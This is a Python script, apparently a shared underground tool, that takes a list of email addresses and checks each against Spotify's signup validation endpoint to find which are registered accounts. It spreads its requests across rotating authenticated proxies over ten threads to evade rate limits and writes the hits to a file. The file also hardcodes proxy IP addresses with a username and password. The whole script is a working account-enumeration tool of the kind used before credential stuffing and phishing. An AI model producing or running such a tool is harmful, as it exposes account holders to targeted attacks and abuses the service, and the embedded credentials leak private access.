import requests
import re
from colorama import Fore, Style, init
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle

init()
 
header = """
  ______     __            ______   ______     ______     ______   ______   ______     ______     ______     ______     ______    
  /\  ___\   /\ \          /\  == \ /\  == \   /\  __ \   /\  ___\ /\  ___\ /\  ___\   /\  ___\   /\  ___\   /\  __ \   /\  == \   
  \ \  __\   \ \ \____     \ \  _-/ \ \  __<   \ \ \/\ \  \ \  __\ \ \  __\ \ \  __\   \ \___  \  \ \___  \  \ \ \/\ \  \ \  __<   
   \ \_____\  \ \_____\     \ \_\    \ \_\ \_\  \ \_____\  \ \_\    \ \_\    \ \_____\  \/\_____\  \/\_____\  \ \_____\  \ \_\ \_\ 
    \/_____/   \/_____/      \/_/     \/_/ /_/   \/_____/   \/_/     \/_/     \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/ 
                                                                                                                                
                                                  👾  Coded By EL PROFESSOR 👾
                                                  ATTENTION 📢 USE ONLY HTTP Proxy
                                            FEEL FREE TO TXT ME ON TG: @EL_PROFESSOR_SY
"""

print(header)

# List of proxies (ip:port:user:pass)
proxy_list = [
   '45.127.248.127:5128:huktrrpq:yny9vazg23vow',
    '64.64.118.149:6732:huktrrpq:yny9vazg23vow',
    '157.52.253.244:6204:huktrrpq:yny9vazg23vow' 
]

proxy_cycle = cycle(proxy_list)

def get_next_proxy():
    proxy = next(proxy_cycle)
    proxy_auth = proxy.split(':')
    proxy_url = f"http://{proxy_auth[2]}:{proxy_auth[3]}@{proxy_auth[0]}:{proxy_auth[1]}"
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def extract_emails(input_file_path):
    email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    extracted_emails = []

    try:
        with open(input_file_path, 'r') as file:
            lines = file.readlines()
            for line in lines:
                matches = email_pattern.findall(line)
                extracted_emails.extend(matches)
        return extracted_emails
    except FileNotFoundError:
        print(f"{Fore.RED}Error: The file '{input_file_path}' does not exist.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")

    return []

def check_email(email):
    url = "https://spclient.wg.spotify.com/signup/public/v1/account?validate=1"
    payload = {'email': email}
    try:
        response = requests.post(url, data=payload, proxies=get_next_proxy())
        if response.status_code == 200:
            response_json = response.json()
            if "email" in response_json.get("errors", {}):
                if response_json["errors"]["email"] == "That email is already registered to an account.":
                    print(f"{email} - {Fore.GREEN}Valid{Style.RESET_ALL}")
                    return email
                else:
                    print(f"{email} - {Fore.RED}Not valid{Style.RESET_ALL}")
            elif response_json.get("status") == 1:
                print(f"{email} - {Fore.RED}Not valid{Style.RESET_ALL}")
            else:
                print(f"{email} - {Fore.RED}Unknown status{Style.RESET_ALL}")
        else:
            print(f"{email} - {Fore.RED}Request failed with status code {response.status_code}{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{email} - {Fore.RED}Request failed: {e}{Style.RESET_ALL}")
    return None

def check_emails(emails, output_file_path):
    valid_emails = []
    start_saving = False
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_email, email) for email in emails]
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid_emails.append(result)
                if not start_saving:
                    start_saving = True
                    save_valid_emails(valid_emails, output_file_path, append=False)
                else:
                    save_valid_emails([result], output_file_path, append=True)
    return valid_emails

def save_valid_emails(valid_emails, output_file_path, append=True):
    mode = 'a' if append else 'w'
    try:
        with open(output_file_path, mode) as valid_file:
            for valid_email in valid_emails:
                valid_file.write(f"{valid_email}\n")
        print(f"{Fore.GREEN}Saved {len(valid_emails)} valid emails to {output_file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred while saving valid emails: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
 
    print("Current Working Directory:", os.getcwd())
 
    input_file_name = input("Enter the name of the file to check (e.g., emails.txt): ")
    output_file_name = input("Enter the name of the file to save valid emails (e.g., Valid.txt): ")
 
    if not os.path.isfile(input_file_name):
        print(f"{Fore.RED}Error: The file '{input_file_name}' does not exist.{Style.RESET_ALL}")
    else:
        emails = extract_emails(input_file_name)
        if emails:
            check_emails(emails, output_file_name)
